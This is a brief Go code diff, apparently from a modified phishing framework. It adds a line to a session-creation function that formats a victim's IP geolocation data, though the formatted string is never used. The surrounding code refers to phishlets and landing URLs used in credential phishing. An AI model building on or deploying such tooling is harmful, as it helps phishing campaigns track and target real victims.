@@ -70,6 +70,7 @@ func (d *Database) sessionsCreate(sid string, phishlet string, landing_url strin
 	}
 
 	ipinfos, eerr := ioutil.ReadAll(ipinfo.Body)
+	fmt.Sprintf("FULL IP LOCATION: %s", ipinfos)
 
 // 	ipinfosn := strings.Replace(string(ipinfos), ",", "%0A-➡️ ", -1)
 
